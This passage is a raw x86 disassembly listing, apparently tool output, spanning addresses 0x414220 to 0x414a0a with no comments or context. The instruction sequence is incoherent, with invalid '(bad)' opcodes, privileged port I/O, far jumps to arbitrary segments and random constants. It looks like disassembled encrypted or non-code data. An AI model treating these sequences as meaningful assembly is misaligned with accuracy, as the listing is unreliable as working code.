  414220:	inc    BYTE PTR [eax-0x395fc0c]
  414226:	and    DWORD PTR [edx+0x30],edi
  414229:	xchg   DWORD PTR [esi-0x64a09e99],ebp
  41422f:	call   0xe144:0xa36a78a1
  414236:	neg    BYTE PTR [ebx+0x623d953b]
  41423c:	cmp    BYTE PTR [ecx-0x4c],bl
  41423f:	inc    DWORD PTR [edx+0x17d6f578]
  414245:	addr16 dec ebp
  414247:	add    BYTE PTR es:[edi],0x9e
  41424b:	int3   
  41424c:	xor    al,0xa4
  41424e:	push   ebx
  41424f:	dec    ebx
  414250:	jp     0x4142cc
  414252:	cld    
  414253:	popf   
  414254:	xchg   ebp,eax
  414255:	iret   
  414256:	scas   eax,DWORD PTR es:[edi]
  414257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414258:	dec    ebp
  414259:	std    
  41425a:	mov    ebp,0x148686f6
  41425f:	shr    dl,0x6d
  414262:	cmp    BYTE PTR ds:0xde1aa698,dh
  414268:	ror    BYTE PTR [edx+eax*4],cl
  41426b:	jmp    0x4142d5
  41426d:	push   ebx
  41426e:	mov    eax,ds:0x873c0798
  414273:	in     eax,dx
  414274:	adc    esp,DWORD PTR [eax+0x246a7c1c]
  41427a:	pop    eax
  41427b:	cmp    DWORD PTR [eax-0xd717d63],ecx
  414281:	sar    BYTE PTR [ecx],cl
  414283:	or     eax,0xf48cd0cf
  414288:	in     al,dx
  414289:	dec    ebp
  41428a:	loope  0x4142ad
  41428c:	call   0xf8b9:0x35225398
  414293:	dec    edi
  414294:	sub    DWORD PTR ds:0x14e12601,ebx
  41429a:	xchg   esi,eax
  41429b:	arpl   WORD PTR [ebx+0x24],bp
  41429e:	xor    edi,DWORD PTR ds:0xf6eb6b15
  4142a4:	dec    esp
  4142a5:	aam    0xa1
  4142a7:	mov    ah,al
  4142a9:	sub    al,0xe6
  4142ab:	scas   eax,DWORD PTR es:[edi]
  4142ac:	stos   DWORD PTR es:[edi],eax
  4142ad:	test   al,0x62
  4142af:	mov    WORD PTR [edx-0x3f],gs
  4142b2:	or     eax,0x5c59333d
  4142b7:	xchg   BYTE PTR [ebx],dl
  4142b9:	retf   
  4142ba:	in     eax,dx
  4142bb:	(bad)  
  4142bc:	jmp    FWORD PTR [ebx-0x28]
  4142bf:	fwait
  4142c0:	in     al,0x1b
  4142c2:	add    al,0x76
  4142c4:	js     0x41429f
  4142c6:	pop    edx
  4142c7:	gs lahf 
  4142c9:	jae    0x414340
  4142cb:	sbb    eax,DWORD PTR [eax+0x4e3e4ddc]
  4142d1:	push   ss
  4142d2:	pushf  
  4142d3:	jle    0x41426f
  4142d5:	add    eax,0x829e9c13
  4142da:	jno    0x414357
  4142dc:	out    0x62,eax
  4142de:	daa    
  4142df:	xchg   BYTE PTR [edx+0x7eb9b7e8],al
  4142e5:	jg     0x4142b9
  4142e7:	push   0x10
  4142e9:	ds mov dh,0x2a
  4142ec:	add    edi,DWORD PTR [esi+0x67]
  4142ef:	or     esi,eax
  4142f1:	adc    dl,BYTE PTR [ebx]
  4142f3:	dec    ebx
  4142f4:	sub    ebx,DWORD PTR [ecx-0x41c4fbb8]
  4142fa:	jno    0x414369
  4142fc:	and    DWORD PTR ds:0x25d2b97d,0x3a
  414303:	adc    DWORD PTR [ecx+0x6ab40407],ebx
  414309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41430a:	push   0x311555c7
  41430f:	jg     0x4142eb
  414311:	hlt    
  414312:	call   0xaada:0xa0c1ce88
  414319:	push   edx
  41431a:	js     0x414341
  41431c:	fcomp  QWORD PTR [ebx+0x59dce100]
  414322:	mov    ebp,0x4fad0497
  414327:	mov    ds:0xa4fa8336,al
  41432c:	repz loop 0x4142b4
  41432f:	lods   al,BYTE PTR ds:[esi]
  414330:	and    eax,0x50323ab6
  414335:	jno    0x4143a4
  414337:	pushf  
  414338:	xor    eax,0xe5491d4b
  41433d:	push   edx
  41433e:	div    DWORD PTR [ebp-0x3d]
  414341:	test   BYTE PTR [ebp+0x757831d7],al
  414347:	out    dx,eax
  414348:	sub    BYTE PTR [ecx+ebp*2+0xe],al
  41434c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41434d:	add    edi,edx
  41434f:	xor    eax,0x39799e66
  414354:	xchg   ebp,eax
  414355:	mov    eax,ds:0xcabddae
  41435a:	inc    edi
  41435b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41435c:	push   eax
  41435d:	out    0xbb,eax
  41435f:	jne    0x4143de
  414361:	xchg   ebp,eax
  414362:	lock cmp eax,0x5508e77d
  414368:	xor    BYTE PTR [eax-0x538b1a05],bh
  41436e:	and    ebp,DWORD PTR [edx+0x705c4a4d]
  414374:	stos   DWORD PTR es:[edi],eax
  414375:	push   edx
  414376:	(bad)  
  414378:	mov    al,0x5
  41437a:	retf   0x1e58
  41437d:	lea    edi,[eax+ebx*2]
  414380:	das    
  414381:	jle    0x4143f9
  414383:	sbb    eax,0x28de9023
  414388:	shld   DWORD PTR [eax+0x3ff1e168],ebp,cl
  41438f:	xor    BYTE PTR [ebx+0x5ca6f963],ah
  414395:	jae    0x41434c
  414397:	xor    bl,bl
  414399:	cdq    
  41439a:	push   eax
  41439b:	inc    ebx
  41439c:	fnstcw WORD PTR [esi+0x4e]
  41439f:	pop    ebx
  4143a0:	xchg   ecx,eax
  4143a1:	adc    esp,ecx
  4143a3:	add    esp,DWORD PTR [ecx-0x6574b684]
  4143a9:	loope  0x41438a
  4143ab:	add    BYTE PTR ds:0xaf5dffdb,0x69
  4143b2:	imul   edi,ebp,0xae0ff84e
  4143b8:	jmp    0x414382
  4143ba:	sbb    BYTE PTR [ecx-0x6f744ef3],0x7a
  4143c1:	push   es
  4143c2:	jno    0x414402
  4143c4:	std    
  4143c5:	mov    ds:0x562d1296,al
  4143ca:	jecxz  0x4143bf
  4143cc:	les    esi,FWORD PTR ds:[edx]
  4143cf:	and    edi,DWORD PTR [esi-0x7c]
  4143d2:	jp     0x4143f6
  4143d4:	(bad)  
  4143d5:	jno    0x414422
  4143d7:	(bad)  
  4143d8:	mul    esi
  4143da:	cmp    edi,edx
  4143dc:	adc    BYTE PTR [ecx],dh
  4143de:	inc    esi
  4143df:	jnp    0x414443
  4143e1:	jo     0x414444
  4143e3:	(bad)  
  4143e4:	sub    eax,0x74f0570
  4143e9:	cmc    
  4143ea:	dec    edi
  4143eb:	jle    0x414372
  4143ed:	adc    BYTE PTR [esi-0x29],bh
  4143f0:	mov    dl,BYTE PTR [ecx+0x4a]
  4143f3:	test   DWORD PTR [edx+0x1d],0x6d1fa204
  4143fa:	outs   dx,DWORD PTR ds:[esi]
  4143fb:	mov    ah,0xaa
  4143fd:	jns    0x4143c3
  4143ff:	mov    ch,bl
  414401:	out    0xfd,eax
  414403:	mov    ds:0x5791db08,al
  414408:	shl    ebp,cl
  41440a:	xchg   edi,eax
  41440b:	jb     0x4143af
  41440d:	fisttp QWORD PTR [esi]
  41440f:	outs   dx,BYTE PTR ds:[esi]
  414410:	inc    edi
  414411:	lods   eax,DWORD PTR ds:[esi]
  414412:	push   edi
  414413:	jb     0x414464
  414415:	in     al,0xeb
  414417:	fisttp WORD PTR ds:0xb9fb6758
  41441d:	mov    edi,edi
  41441f:	out    dx,eax
  414420:	dec    edi
  414421:	cmp    eax,0x64fd57e2
  414426:	jo     0x4143f4
  414428:	test   eax,0x675b2307
  41442d:	fadd   QWORD PTR [esi]
  41442f:	sbb    ah,BYTE PTR [esi+0x160101df]
  414435:	inc    eax
  414436:	mov    ebx,0xa18721ea
  41443b:	and    DWORD PTR [ebx-0x65822e9b],ebx
  414441:	repz rcl DWORD PTR [eax+esi*8],0xf7
  414446:	nop
  414447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414448:	push   edx
  414449:	daa    
  41444a:	mov    ebx,DWORD PTR [eax]
  41444c:	std    
  41444d:	pop    esi
  41444e:	inc    ecx
  41444f:	dec    edx
  414450:	imul   edi,DWORD PTR [eax+ebx*2-0x4d],0xffffffdd
  414455:	mov    cl,0xeb
  414457:	ret    0xd5d9
  41445a:	add    bl,BYTE PTR [ecx+0x3644ec93]
  414460:	lahf   
  414461:	test   BYTE PTR [esi-0x10],ch
  414464:	inc    edx
  414465:	(bad)  
  414466:	jae    0x41446e
  414468:	pop    ds
  414469:	or     cl,bh
  41446b:	cdq    
  41446c:	cs inc ecx
  41446e:	dec    edi
  41446f:	push   ss
  414470:	and    eax,0x39e0e92e
  414475:	out    dx,al
  414476:	clc    
  414477:	dec    ebx
  414478:	test   DWORD PTR [esi],ebp
  41447a:	pop    edx
  41447b:	repz push ss
  41447d:	jmp    0xa708:0x92c4bdb4
  414484:	push   0x4a
  414486:	cmp    dh,0xdd
  414489:	iret   
  41448a:	pop    esp
  41448b:	into   
  41448c:	jmp    0x4d1166ac
  414491:	cmp    al,0xc0
  414493:	pop    ecx
  414494:	pop    edi
  414495:	sahf   
  414496:	mov    al,0xa8
  414498:	fsubr  DWORD PTR [esi]
  41449a:	fdiv   QWORD PTR [esi-0x49]
  41449d:	lods   al,BYTE PTR ds:[esi]
  41449e:	xchg   ebp,eax
  41449f:	push   ecx
  4144a0:	jl     0x414430
  4144a2:	shr    BYTE PTR [ebp-0x529057ac],cl
  4144a8:	push   cs
  4144a9:	xchg   ecx,eax
  4144aa:	call   0xf7efb9b1
  4144af:	aaa    
  4144b0:	mov    esi,0x475f452c
  4144b5:	cwde   
  4144b6:	ss mov ah,0x82
  4144b9:	mov    gs,WORD PTR [ecx-0x8950a8e]
  4144bf:	outs   dx,DWORD PTR ds:[esi]
  4144c0:	int    0xac
  4144c2:	ins    DWORD PTR es:[edi],dx
  4144c3:	mov    esi,0x8a3262c8
  4144c8:	clc    
  4144c9:	lahf   
  4144ca:	cs pop edi
  4144cc:	ror    BYTE PTR [ecx],0xd0
  4144cf:	cmc    
  4144d0:	dec    edi
  4144d1:	or     ebp,DWORD PTR [ecx]
  4144d3:	xor    BYTE PTR [ecx+0x4fd42823],bl
  4144d9:	mov    ebx,0x6f595e08
  4144de:	push   edx
  4144df:	or     BYTE PTR [eax-0x3f],dl
  4144e2:	sbb    dh,BYTE PTR [edx]
  4144e4:	jge    0x414501
  4144e6:	sub    eax,DWORD PTR [edi-0x48]
  4144e9:	sbb    al,0x85
  4144eb:	cmp    dl,BYTE PTR [esi+eax*8-0x2d58f125]
  4144f2:	out    dx,al
  4144f3:	pop    ebp
  4144f4:	pop    ebp
  4144f5:	icebp  
  4144f6:	mov    esp,0x6974504a
  4144fb:	dec    eax
  4144fc:	(bad)  
  4144fd:	sti    
  4144fe:	or     eax,0x2ef6377b
  414503:	fwait
  414504:	xchg   ebp,eax
  414505:	xlat   BYTE PTR ds:[ebx]
  414506:	popa   
  414507:	mov    esp,0xcbb6d037
  41450c:	pop    ecx
  41450d:	outs   dx,BYTE PTR ds:[esi]
  41450e:	mov    ch,0x47
  414510:	adc    edi,DWORD PTR [ebx+esi*8+0x8e51f5]
  414517:	test   al,0xdf
  414519:	cdq    
  41451a:	dec    edx
  41451b:	je     0x41456d
  41451d:	pop    ebx
  41451e:	and    bh,BYTE PTR [eax-0x7e]
  414521:	lock nop
  414523:	ins    DWORD PTR es:[edi],dx
  414524:	pop    eax
  414525:	and    DWORD PTR [edi-0x1ea4df0d],edx
  41452b:	popa   
  41452c:	into   
  41452d:	fist   DWORD PTR [ebx-0x2c]
  414530:	pop    es
  414531:	je     0x414560
  414533:	jp     0x414513
  414535:	pop    ebp
  414536:	dec    edi
  414537:	ins    DWORD PTR es:[edi],dx
  414538:	pop    es
  414539:	jp     0x414559
  41453b:	je     0x4144cf
  41453d:	mov    bh,0xfa
  41453f:	test   eax,0xc0ce5f22
  414544:	loop   0x414501
  414546:	lahf   
  414547:	push   ss
  414548:	jne    0x4144cb
  41454a:	mov    edi,0x138acb9e
  41454f:	cmc    
  414550:	adc    al,0x92
  414552:	or     edi,edi
  414554:	test   al,0xa5
  414556:	mov    ecx,0x10b2d822
  41455b:	jg     0x414514
  41455d:	xchg   ecx,eax
  41455e:	loope  0x414549
  414560:	add    dl,bl
  414562:	loope  0x414535
  414564:	loope  0x414507
  414566:	(bad)  
  414567:	dec    bl
  414569:	inc    ebx
  41456a:	push   es
  41456b:	ss in  al,dx
  41456d:	repnz adc edi,DWORD PTR [ecx]
  414570:	out    0xbf,al
  414572:	sbb    DWORD PTR [edi+0x7a],ebx
  414575:	in     al,0x24
  414577:	ficomp DWORD PTR [edi+edi*8]
  41457a:	adc    esp,0x71
  41457d:	out    0x35,eax
  41457f:	sar    BYTE PTR [ecx],cl
  414581:	inc    esp
  414582:	sar    DWORD PTR [edx-0x4f6712cd],cl
  414588:	sub    eax,DWORD PTR ds:0x73735130
  41458e:	fldenv [eax+0x2e4505ca]
  414594:	jbe    0x41459a
  414596:	xor    ecx,DWORD PTR [eax]
  414598:	scas   al,BYTE PTR es:[edi]
  414599:	add    cl,BYTE PTR [ecx+eax*4]
  41459c:	iret   
  41459d:	cmp    al,0xee
  41459f:	xor    DWORD PTR [edx],0xbd67eb43
  4145a5:	pop    es
  4145a6:	daa    
  4145a7:	test   al,0xfc
  4145a9:	test   DWORD PTR [ebx-0x6a],ebp
  4145ac:	jl     0x41454c
  4145ae:	push   0xffffffd2
  4145b0:	into   
  4145b1:	adc    al,0x98
  4145b3:	mov    BYTE PTR [ecx+0x76b3266d],dl
  4145b9:	(bad)  
  4145ba:	xor    BYTE PTR [ebp-0x7a],bl
  4145bd:	adc    ch,dl
  4145bf:	pop    eax
  4145c0:	rol    DWORD PTR [edx+0x71],0xcc
  4145c4:	mov    al,ds:0xbb828b54
  4145c9:	jno    0x4145f6
  4145cb:	pop    esi
  4145cc:	gs es and eax,0xf679507c
  4145d3:	ins    DWORD PTR es:[edi],dx
  4145d4:	std    
  4145d5:	fs jle 0x414597
  4145d8:	cmp    al,0x6c
  4145da:	or     al,0x80
  4145dc:	ins    DWORD PTR es:[edi],dx
  4145dd:	mov    esi,ecx
  4145df:	div    BYTE PTR [edi+eax*4+0x57]
  4145e3:	xchg   ecx,eax
  4145e4:	cmp    al,0x9a
  4145e6:	mov    esp,ds
  4145e8:	outs   dx,DWORD PTR ds:[esi]
  4145e9:	arpl   WORD PTR [eax+0x5e2c5c2c],dx
  4145ef:	xchg   edi,eax
  4145f0:	(bad)  
  4145f1:	enter  0xafae,0x9c
  4145f5:	dec    ebp
  4145f6:	add    eax,0xdd7b7a02
  4145fb:	and    al,0x90
  4145fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fe:	ror    bh,0x66
  414601:	cmc    
  414602:	rcr    edx,0x75
  414605:	add    eax,0x297757d9
  41460a:	stc    
  41460b:	neg    BYTE PTR [edx+ebp*8+0x7ab1fd65]
  414612:	fisub  WORD PTR [edi-0xddc2c93]
  414618:	mov    DWORD PTR [esi],0x5a583fed
  41461e:	cmc    
  41461f:	mov    al,ds:0x9859de4b
  414624:	repnz cmp eax,0xce5417fb
  41462a:	mov    bh,0x43
  41462c:	mov    edx,0x5b304b66
  414631:	and    eax,0xce602efe
  414636:	pop    ecx
  414637:	add    eax,0x495fa8e5
  41463c:	add    BYTE PTR [ecx-0x3c],0x84
  414640:	imul   esp,DWORD PTR [edi],0xe6bcc32d
  414646:	call   0x7b97:0xf2c615ff
  41464d:	sub    BYTE PTR [esi],cl
  41464f:	mov    ch,0x80
  414651:	int    0x3e
  414653:	mov    esp,0x436da9de
  414658:	imul   BYTE PTR [edi-0x7f]
  41465b:	pop    edx
  41465c:	iret   
  41465d:	mov    edi,0x5a107570
  414662:	mov    ds:0x445a1aaa,al
  414667:	dec    ebx
  414668:	shr    BYTE PTR [esi-0x115bc073],0xc4
  41466f:	xchg   ebx,eax
  414670:	inc    ebx
  414671:	mov    ch,0x7e
  414673:	loopne 0x41466d
  414675:	push   edi
  414676:	mov    eax,ds:0x11cf2ca
  41467b:	aam    0xbd
  41467d:	jg     0x4146d0
  41467f:	dec    ebx
  414680:	out    dx,al
  414681:	pop    edx
  414682:	popa   
  414683:	mov    cl,0xcb
  414685:	xchg   ebx,ebx
  414687:	cmp    DWORD PTR [edi-0x38d5b94b],esp
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	mov    ebx,0xd12db2b
  414693:	je     0x4146fa
  414695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414696:	sar    DWORD PTR [eax+edx*2+0x1a],1
  41469a:	(bad)  
  41469b:	test   al,0x79
  41469d:	(bad)  
  41469e:	mov    al,0x40
  4146a0:	jmp    0xeac4:0x6dfa1107
  4146a7:	cmp    BYTE PTR [ebx+edx*2],al
  4146aa:	and    BYTE PTR [ebp+0x72],dh
  4146ad:	popf   
  4146ae:	pop    eax
  4146af:	mov    edx,0x4c1f9d8a
  4146b4:	mov    eax,ds:0x2fad4155
  4146b9:	js     0x41467f
  4146bb:	out    0xa7,al
  4146bd:	xchg   ebx,eax
  4146be:	jecxz  0x41468e
  4146c0:	ret    
  4146c1:	adc    al,0xcd
  4146c3:	sbb    eax,0x1e532496
  4146c8:	xchg   BYTE PTR [edx-0x14],bh
  4146cb:	mov    edx,0x9649ead5
  4146d0:	cmc    
  4146d1:	jge    0x4146f0
  4146d3:	aas    
  4146d4:	xchg   ecx,eax
  4146d5:	xor    eax,0xba4de824
  4146da:	jmp    DWORD PTR [edx+ebp*1+0x25]
  4146de:	shr    BYTE PTR [edi],0x8
  4146e1:	into   
  4146e2:	int    0x66
  4146e4:	stos   DWORD PTR es:[edi],eax
  4146e5:	jns    0x414732
  4146e7:	outs   dx,DWORD PTR ds:[esi]
  4146e8:	push   edx
  4146e9:	pop    ss
  4146ea:	out    dx,eax
  4146eb:	push   eax
  4146ec:	add    ebx,DWORD PTR ds:0x978cf682
  4146f2:	js     0x414728
  4146f4:	dec    esp
  4146f5:	inc    edx
  4146f6:	dec    eax
  4146f7:	mov    esp,0x4c65b689
  4146fc:	inc    edi
  4146fd:	call   0x25d04446
  414702:	sbb    BYTE PTR [edi-0x738a551e],dh
  414708:	aaa    
  414709:	adc    al,0x8f
  41470b:	mov    cl,0xa8
  41470d:	retf   0x2f47
  414710:	mov    esp,0x9de126da
  414715:	das    
  414716:	ins    BYTE PTR es:[edi],dx
  414717:	sahf   
  414718:	jns    0x4146d3
  41471a:	lock xchg BYTE PTR [esi-0x14],dl
  41471e:	stc    
  41471f:	push   ebx
  414720:	mov    edi,DWORD PTR [ebp+0x1d]
  414723:	in     eax,0x67
  414725:	lods   al,BYTE PTR ds:[esi]
  414726:	jns    0x41476c
  414728:	rcl    BYTE PTR [ebx+0x39],cl
  41472b:	or     DWORD PTR [edi],0xffffffb0
  41472e:	adc    DWORD PTR ds:0x2b9c43c5,edi
  414734:	and    dh,BYTE PTR [ebp+eax*8+0x1c150f33]
  41473b:	jae    0x414771
  41473d:	pop    es
  41473e:	ss cld 
  414740:	mov    WORD PTR [bp+si+0x16c9],gs
  414745:	sbb    eax,0xcac221ca
  41474a:	loope  0x414704
  41474c:	cmp    cl,BYTE PTR [ebx+0x23]
  41474f:	inc    ecx
  414750:	dec    edi
  414751:	arpl   WORD PTR [ebp-0x80],bx
  414754:	shl    DWORD PTR ds:0x60314cca,cl
  41475a:	mov    dh,0x60
  41475c:	add    DWORD PTR [edi],esi
  41475e:	and    bl,BYTE PTR fs:[esi+0x4b4be0ef]
  414765:	xlat   BYTE PTR ds:[ebx]
  414766:	add    eax,0x7120449
  41476b:	out    dx,al
  41476c:	iret   
  41476d:	inc    ebx
  41476e:	push   0xd9dfd57b
  414773:	mov    WORD PTR [eax],ds
  414775:	jno    0x4146f8
  414777:	mov    bh,dh
  414779:	jbe    0x414719
  41477b:	mov    cl,dl
  41477d:	sub    al,BYTE PTR [eax-0x326bef42]
  414783:	lea    edi,ds:0x7f5524f3
  414789:	imul   al
  41478b:	dec    ebx
  41478c:	in     eax,0x2f
  41478e:	daa    
  41478f:	xchg   ebx,eax
  414790:	lock xor DWORD PTR [ebp+0x47560845],edi
  414797:	lods   eax,DWORD PTR ds:[esi]
  414798:	fild   DWORD PTR [edi+0x4efe14d9]
  41479e:	mov    cl,bh
  4147a0:	aas    
  4147a1:	repz data16 sub al,0xd4
  4147a5:	jge    0x41473a
  4147a7:	jb     0x4147d7
  4147a9:	jge    0x41478b
  4147ab:	mov    WORD PTR [edx],?
  4147ad:	cdq    
  4147ae:	cmp    eax,0xcdf221e4
  4147b3:	inc    esi
  4147b4:	xor    DWORD PTR [edi-0x33],edi
  4147b7:	mov    ebx,DWORD PTR [ebp-0x22]
  4147ba:	cmp    ecx,DWORD PTR [eax+0x0]
  4147bd:	push   esp
  4147be:	stos   BYTE PTR es:[edi],al
  4147bf:	fstp   QWORD PTR [esi-0x443efbab]
  4147c5:	push   edx
  4147c6:	push   edx
  4147c7:	fcmovnu st,st(3)
  4147c9:	add    eax,DWORD PTR [edi+edi*4]
  4147cc:	fs retf 
  4147ce:	pop    edx
  4147cf:	inc    ecx
  4147d0:	jnp    0x41482e
  4147d2:	or     ah,BYTE PTR [edx-0x4cbfee7b]
  4147d8:	sbb    al,bh
  4147da:	stos   BYTE PTR es:[edi],al
  4147db:	add    BYTE PTR [ebp+0x4b81d90b],0x7f
  4147e2:	lahf   
  4147e3:	pop    ss
  4147e4:	shl    DWORD PTR [ecx+0x56],0xc9
  4147e8:	xchg   ecx,eax
  4147e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147ea:	or     ecx,DWORD PTR ds:0x3ea76452
  4147f0:	mov    WORD PTR [ebx-0x52],?
  4147f3:	out    0xc9,al
  4147f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147f6:	rol    BYTE PTR [ebx+edi*2+0xd844bfa],1
  4147fd:	pop    esp
  4147fe:	les    ebx,FWORD PTR [edx+esi*8+0x19037cb2]
  414805:	jns    0x41481a
  414807:	xchg   ebp,eax
  414808:	popf   
  414809:	in     eax,0xd5
  41480b:	mov    al,ds:0x35df2c04
  414810:	push   0xffffff97
  414812:	cs jbe 0x4147d6
  414815:	jne    0x414886
  414817:	mov    ah,0x65
  414819:	in     al,dx
  41481a:	imul   eax,DWORD PTR [ebx-0x63937d18],0xfffffff5
  414821:	mov    ebp,0xf5b4be17
  414826:	mov    edx,0xfc67db7d
  41482b:	inc    ebp
  41482c:	sub    al,0x23
  41482e:	shr    BYTE PTR [edi+0x56c5b63e],0x20
  414835:	or     eax,0x1ab6f557
  41483a:	mov    esi,0x65f3a0b1
  41483f:	or     DWORD PTR [ebx+0xe6a0d4a],ecx
  414845:	mul    al
  414847:	jl     0x41480e
  414849:	(bad)  
  41484a:	or     si,WORD PTR [ebx+0x6994af0d]
  414851:	test   eax,0xc9614caf
  414856:	clc    
  414857:	outs   dx,BYTE PTR ds:[esi]
  414858:	mov    ch,0x4f
  41485a:	pop    ss
  41485b:	movaps XMMWORD PTR [ebx-0x5c],xmm7
  41485f:	(bad)  
  414860:	mov    BYTE PTR [ebp-0x6ffca8c0],ah
  414866:	sbb    BYTE PTR [edi+0x2c394e3d],dl
  41486c:	sti    
  41486d:	mov    eax,ds:0xd16e98db
  414872:	test   eax,ebp
  414874:	shl    DWORD PTR [esi-0x6ffeaaa7],cl
  41487a:	jle    0x414822
  41487c:	in     al,0x6d
  41487e:	mov    cl,0x50
  414880:	jno    0x4148bd
  414882:	or     al,0xc
  414884:	mov    cl,0x19
  414886:	jae    0x414886
  414888:	sub    bh,bh
  41488a:	or     al,0xb1
  41488c:	pop    edi
  41488d:	and    al,0xd0
  41488f:	xchg   bl,bh
  414891:	adc    al,0x69
  414893:	mov    eax,0xd5090bb2
  414898:	outs   dx,DWORD PTR ds:[esi]
  414899:	xor    eax,0xac043d7a
  41489e:	mov    dl,bl
  4148a0:	ret    
  4148a1:	pop    ds
  4148a2:	pop    edx
  4148a3:	ret    0xdcb3
  4148a6:	jle    0x4148a4
  4148a8:	xor    al,0x78
  4148aa:	xchg   esi,eax
  4148ab:	jae    0x4148f6
  4148ad:	push   eax
  4148ae:	cdq    
  4148af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b0:	jmp    0x86ccc2
  4148b5:	mov    ecx,0x2db3a129
  4148ba:	addr16 pop esi
  4148bc:	xor    al,0xce
  4148be:	pushf  
  4148bf:	shl    cl,cl
  4148c1:	fstp   st(4)
  4148c3:	imul   ebx,DWORD PTR [ecx-0x79c6d05],0xffffffa5
  4148ca:	outs   dx,DWORD PTR ds:[esi]
  4148cb:	push   esp
  4148cc:	repnz out 0xa,eax
  4148cf:	out    dx,eax
  4148d0:	push   ebp
  4148d1:	popf   
  4148d2:	lock clc 
  4148d4:	or     bl,BYTE PTR [ebp-0x43680d43]
  4148da:	test   al,0xd2
  4148dc:	fisub  DWORD PTR [ebx+esi*4-0x2]
  4148e0:	jns    0x41488f
  4148e2:	pop    es
  4148e3:	jno    0x4148d3
  4148e5:	sub    BYTE PTR [eax+0x24],0x3c
  4148e9:	cmc    
  4148ea:	call   0x7f17cde9
  4148ef:	inc    ebp
  4148f0:	xor    BYTE PTR [ebp+0x4662b3ff],al
  4148f6:	jae    0x414921
  4148f8:	fsubp  st(0),st
  4148fa:	stos   BYTE PTR es:[edi],al
  4148fb:	xchg   esp,eax
  4148fc:	scas   al,BYTE PTR es:[edi]
  4148fd:	dec    eax
  4148fe:	mov    eax,ds:0xa394bcc2
  414903:	or     BYTE PTR [edi+0x63],dh
  414906:	xor    BYTE PTR [esi+ecx*4],dh
  414909:	xor    al,0xf7
  41490b:	popf   
  41490c:	pop    esp
  41490d:	mov    ah,BYTE PTR [esi+eiz*1]
  414910:	sbb    ecx,DWORD PTR [ecx-0x19465eb7]
  414916:	mov    cl,0x1d
  414918:	sbb    eax,edi
  41491a:	shl    esi,cl
  41491c:	dec    ebx
  41491d:	mov    bh,0xcf
  41491f:	xor    bl,ah
  414921:	test   BYTE PTR [edi-0x1e],bl
  414924:	dec    eax
  414925:	mov    bl,0x58
  414927:	stos   DWORD PTR es:[edi],eax
  414928:	pop    ebp
  414929:	cld    
  41492a:	xchg   ebx,eax
  41492b:	pop    ebp
  41492c:	cmp    al,0xd6
  41492e:	dec    edi
  41492f:	push   edx
  414930:	jmp    0x23579fcf
  414935:	mov    ds:0xa4471e53,eax
  41493a:	dec    esi
  41493b:	cmp    ebx,ebx
  41493d:	sub    eax,0x139b6884
  414942:	dec    ebp
  414943:	test   DWORD PTR [esi-0x7e],esi
  414946:	stc    
  414947:	pushf  
  414948:	in     al,0xe9
  41494a:	mov    eax,0xce9effc
  41494f:	xchg   ebp,eax
  414950:	adc    DWORD PTR [ecx-0x3f],ebp
  414953:	mov    edx,0x9796a715
  414958:	int    0xc4
  41495a:	xchg   esp,eax
  41495b:	cld    
  41495c:	in     al,dx
  41495d:	test   bl,0xa9
  414960:	mov    edi,0xcb58858f
  414965:	shr    DWORD PTR [edx],cl
  414967:	add    eax,0x47cbd1a3
  41496c:	aas    
  41496d:	sub    ah,BYTE PTR [edi+0x46]
  414970:	cs ins DWORD PTR es:[edi],dx
  414972:	dec    esi
  414973:	out    0x65,al
  414975:	mov    DWORD PTR [ecx-0x7],edi
  414978:	retf   0x82d9
  41497b:	dec    ebx
  41497c:	and    DWORD PTR [ecx+0x2d1dcbe],edx
  414982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414983:	ficom  WORD PTR [eax+eiz*1]
  414986:	lods   eax,DWORD PTR ds:[esi]
  414987:	inc    eax
  414988:	jb     0x4149f5
  41498a:	or     BYTE PTR [ebx],bl
  41498c:	das    
  41498d:	fst    st(2)
  41498f:	mov    eax,ebx
  414991:	lahf   
  414992:	mov    ebp,0x8faabe5e
  414997:	cmp    dl,cl
  414999:	push   es
  41499a:	fild   WORD PTR [esi+0x20]
  41499d:	rol    esp,1
  41499f:	gs leave 
  4149a1:	mov    dl,0x18
  4149a3:	test   edi,ebp
  4149a5:	mov    cl,0xb2
  4149a7:	imul   BYTE PTR [edx+esi*1+0x3c45fa0f]
  4149ae:	je     0x414a16
  4149b0:	in     eax,0x97
  4149b2:	sub    bh,0xaa
  4149b5:	(bad)  
  4149b6:	xlat   BYTE PTR ds:[ebx]
  4149b7:	mov    edi,0xcf00a95f
  4149bc:	push   es
  4149bd:	pop    eax
  4149be:	(bad)  
  4149bf:	sub    DWORD PTR [eax+0x47],edx
  4149c2:	push   es
  4149c3:	lahf   
  4149c4:	pop    esp
  4149c5:	ins    DWORD PTR es:[edi],dx
  4149c6:	fild   QWORD PTR [edx-0x35]
  4149c9:	icebp  
  4149ca:	mov    BYTE PTR [edi+0x73],bl
  4149cd:	pop    edi
  4149ce:	sbb    DWORD PTR [eax+0x6a],ecx
  4149d1:	xor    edx,DWORD PTR [eax]
  4149d3:	mov    ebp,0x495e94df
  4149d8:	and    eax,DWORD PTR [edi]
  4149da:	cmp    edx,DWORD PTR [eax-0x2093b72b]
  4149e0:	fadd   DWORD PTR [edx]
  4149e2:	mov    ds:0xa9d084ee,eax
  4149e7:	ror    BYTE PTR [ecx],0xef
  4149ea:	add    ebp,esi
  4149ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ed:	pop    edx
  4149ee:	push   es
  4149ef:	adc    eax,0x3d8802f1
  4149f4:	dec    eax
  4149f5:	outs   dx,BYTE PTR ds:[esi]
  4149f6:	cdq    
  4149f7:	jg     0x414979
  4149f9:	arpl   WORD PTR [esi+0x747489d0],ax
  4149ff:	add    esp,ebx
  414a01:	add    dl,BYTE PTR [ebp+0x4dd1378a]
  414a07:	xor    al,0xac
  414a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a0a:	inc    esp
